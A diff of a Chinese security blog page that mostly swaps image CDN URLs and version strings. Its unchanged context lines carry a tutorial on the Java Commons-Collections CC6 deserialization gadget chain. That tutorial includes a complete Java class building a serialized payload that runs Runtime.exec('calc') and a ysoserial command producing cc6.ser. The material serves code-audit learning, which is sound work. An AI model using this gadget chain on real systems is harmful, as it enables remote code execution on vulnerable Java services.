@@ -51,7 +51,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
 <meta property="article:published_time" content="2026-04-03T02:00:00.000Z">
-<meta property="article:modified_time" content="2026-04-03T09:22:01.972Z">
+<meta property="article:modified_time" content="2026-05-14T10:04:40.415Z">
 <meta property="article:author" content="wr0ld">
 <meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="Java">
@@ -68,7 +68,7 @@
   <!-- feed -->
   
 
-  <link rel="stylesheet" href="/css/main.css?v=mp2fxa3j">
+  <link rel="stylesheet" href="/css/main.css?v=mp5bt8lg">
 
 
   
@@ -77,7 +77,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-03T10:00:00+08:00","dateModified":"2026-04-03T17:22:01+08:00","datePublished":"2026-04-03T10:00:00+08:00","description":"","headline":"代码审计 | CC6 链 —— 反向构造 payload 与 ysoserial","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/a7b3c9d2/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/a7b3c9d2/","keywords":"代码审计, Java, 反序列化, Java反序列化, CC6","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/0815e0c55ab65f736be46eb2a8a7d9ca.webp","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-03T10:00:00+08:00","dateModified":"2026-05-14T18:04:40+08:00","datePublished":"2026-04-03T10:00:00+08:00","description":"","headline":"代码审计 | CC6 链 —— 反向构造 payload 与 ysoserial","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/a7b3c9d2/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/a7b3c9d2/","keywords":"代码审计, Java, 反序列化, Java反序列化, CC6","thumbnailUrl":"https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/0815e0c55ab65f736be46eb2a8a7d9ca.webp","image":1}</script>
   
 </head>
 <body><div class="reading-progress-bar"></div>
@@ -174,9 +174,9 @@
 <hr>
 <h3 id="第三步：谁调用-get-？——TiedMapEntry-getValue"><a href="#第三步：谁调用-get-？——TiedMapEntry-getValue" class="headerlink" title="第三步：谁调用 get()？——TiedMapEntry.getValue()"></a>第三步：谁调用 get()？——TiedMapEntry.getValue()</h3><p>这里就和 CC1 分叉了。CC1 是靠 <code>AnnotationInvocationHandler.invoke()</code> 里的 get 来触发，而 CC6 选的是 <code>TiedMapEntry.getValue()</code>。</p>
 <p>TiedMapEntry 也是 commons-collections 里的一个类，它持有一个 map 和一个 key。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image1.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image1.png"></p>
 <p>它的 getValue() 方法：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image2.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image2.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key); <span class="comment">// 直接调用传入 map 的 get 方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>如果让 TiedMapEntry 内部的 map 指向我们构造的 LazyMap，那么：</p>
@@ -187,49 +187,49 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">entry.getValue(); <span class="comment">// 此时可以直接触发</span></span><br></pre></td></tr></table></figure>
 
 <p>key 的值没有严格要求，随便写一个字符串就行。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image3.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image3.png"></p>
 <hr>
 <h3 id="第四步：谁调用-getValue-？——TiedMapEntry-hashCode"><a href="#第四步：谁调用-getValue-？——TiedMapEntry-hashCode" class="headerlink" title="第四步：谁调用 getValue()？——TiedMapEntry.hashCode()"></a>第四步：谁调用 getValue()？——TiedMapEntry.hashCode()</h3><p>在 TiedMapEntry 的同一个文件里，找到了 hashCode() 方法，它内部会调用 getValue()：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image4.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image5.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image4.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image5.png"></p>
 <p>看到这里可能会觉得：<code>getValue()</code> 和 <code>hashCode()</code> 不都能直接触发吗，有什么区别？</p>
 <p>确实，单独调用这两个都能触发，但 hashCode 是 CC6 绕过 JDK 限制的关键所在——因为 HashSet 的 readObject() 方法在反序列化时会自动调用 hashCode()，不需要我们手动触发。</p>
 <hr>
 <h3 id="第五步：HashSet-readObject-触发-hashCode"><a href="#第五步：HashSet-readObject-触发-hashCode" class="headerlink" title="第五步：HashSet.readObject() 触发 hashCode()"></a>第五步：HashSet.readObject() 触发 hashCode()</h3><p>看一下 HashSet 的 readObject() 方法：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image6.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image6.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HashSet.readObject() 简化逻辑</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">    <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">    map.put(e, PRESENT); <span class="comment">// map 是 HashMap，e 是我们的 TiedMapEntry</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>跟进 <code>map.put(e, PRESENT)</code> 会发现内部会调用 put 函数：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image7.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image7.png"></p>
 <p>然后是 hash 函数：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image8.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image8.png"></p>
 <p>这里的 key 就是 <code>map.put(e, PRESENT)</code> 里的 e，也就是我们的 TiedMapEntry，所以最终会调用 <code>TiedMapEntry.hashCode()</code>。</p>
 <p>而整个逻辑都在 HashSet.readObject() 里面，也就是说：<strong>反序列化 HashSet 时必然触发这条链</strong>。</p>
 <hr>
 <h2 id="大坑：序列化时就触发了"><a href="#大坑：序列化时就触发了" class="headerlink" title="大坑：序列化时就触发了"></a>大坑：序列化时就触发了</h2><p>调用链搞清楚之后，开始动手构造 HashSet 对象。可以看到 HashSet 的构造方法不需要传参：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image9.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image9.png"></p>
 <p>但如果直接写成这样：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chain);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"><span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br></pre></td></tr></table></figure>
 
 <p>此时 HashSet 和 TiedMapEntry 还没有关联，没有效果：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image10.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image10.png"></p>
 <p>需要把 TiedMapEntry 添加进 HashSet，才能在 readObject 的 for 循环里被遍历到。构造方法不传参，所以用 add：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashSet.add(entry);</span><br></pre></td></tr></table></figure>
 
 <hr>
 <p>但这里就碰到问题了。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image11.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image11.png"></p>
 <p>**add() 方法内部也会调用 <code>map.put(e, PRESENT)</code>**，这意味着在本地添加元素的时候就已经触发了一次 hashCode()，链子直接在序列化阶段就跑了。</p>
 <p>如果 payload 直接这么写：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chain);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">hashSet.add(entry); <span class="comment">// ⚠️ 这里就执行了 calc，计算器直接在本机弹了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.ser&quot;</span>))) &#123;</span><br><span class="line">    oos.writeObject(hashSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>序列化的时候就被触发了：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image12.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image12.png"></p>
 <p>反序列化的时候反而没有触发：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image13.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image13.png"></p>
 <hr>
 <h3 id="缓存问题的根因"><a href="#缓存问题的根因" class="headerlink" title="缓存问题的根因"></a>缓存问题的根因</h3><p>问题出在 LazyMap 的 get() 方法里的缓存机制：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image14.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image14.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// 关键判断：检查 map 仓库里是否已经有了这个 key</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// 只有仓库里【没有】这个 key，才会触发 transform</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        <span class="comment">// 进货完成后，把结果存入仓库（产生缓存）</span></span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果仓库里【已经有】这个 key 了，直接返回旧值</span></span><br><span class="line">    <span class="comment">// 此时根本不会走到上面的 transform() 逻辑</span></span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><strong>一句话总结：只要 innerMap 不是空的，恶意链就永远没机会上场。</strong></p>
@@ -248,9 +248,9 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6Simple</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. 真正的恶意链</span></span><br><span class="line">        Transformer[] trueTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">trueChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(trueTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 构造 LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(innerMap, trueChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 创建 TiedMapEntry 并添加进 HashSet</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashSet.add(entry); <span class="comment">// ⚠️ 此时会弹一次计算器，innerMap 产生缓存</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 清空缓存，否则反序列化时 LazyMap.get 会直接返回旧值</span></span><br><span class="line">        innerMap.clear();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 序列化</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.ser&quot;</span>))) &#123;</span><br><span class="line">            oos.writeObject(hashSet);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;payload.ser 生成完毕&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>运行效果：序列化时弹一次（因为 add 触发），但 innerMap 已被清空：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image15.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image15.png"></p>
 <p>反序列化时正常触发：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image16.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image16.png"></p>
 <hr>
 <h3 id="解法二（完整版）：假链-反射换真链"><a href="#解法二（完整版）：假链-反射换真链" class="headerlink" title="解法二（完整版）：假链 + 反射换真链"></a>解法二（完整版）：假链 + 反射换真链</h3><p>如果不想让序列化阶段弹窗（更接近实战场景），可以先用假链条占位，等 add 完成之后再通过反射把真链换进去，最后清缓存。</p>
 <p>思路：</p>
@@ -271,11 +271,11 @@
 <h2 id="对比-ysoserial-的实现"><a href="#对比-ysoserial-的实现" class="headerlink" title="对比 ysoserial 的实现"></a>对比 ysoserial 的实现</h2><p>ysoserial 里也有 CC6 的实现，可以直接用：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 <span class="string">&quot;calc&quot;</span> &gt; cc6.ser</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image17.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image17.png"></p>
 <p>把生成的 cc6.ser 放到项目根目录，用之前写的反序列化代码跑一下，可以正常触发：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image18.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image18.png"></p>
 <p>在 <code>ysoserial/payloads/</code> 下能找到 CommonsCollections6.class：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image19.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/cc6_image19.png"></p>
 <p>看了下源码，ysoserial 的实现思路大差不差，不过它不是先传假链，而是直接传了一个无害字符串占位，然后通过反射直接修改底层的链条。另外原版还做了更多细节处理来保证兼容性，总体思路是一致的。</p>
 <hr>
 <h2 id="为什么说-CC6-是通杀链"><a href="#为什么说-CC6-是通杀链" class="headerlink" title="为什么说 CC6 是通杀链"></a>为什么说 CC6 是通杀链</h2><p>CC6 在 <strong>JDK 版本兼容性</strong> 和 <strong>依赖环境稳定性</strong> 上远优于 CC1、CC2 这些链：</p>
@@ -737,7 +737,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=mp2fxa3l" defer></script>
+<script src="/js/main.js?v=mp5bt8li" defer></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -1001,7 +1001,7 @@
 <script src="/js/plugins/hotkeys.js"></script>
 
 <!-- Achievements / Card System -->
-<script src="/js/plugins/achievements.js?v=mp2fxa3m"></script>
+<script src="/js/plugins/achievements.js?v=mp5bt8li"></script>
 
 <!-- Special Days - 节日彩蛋系统 -->
 <script src="/js/plugins/special-days.js"></script>
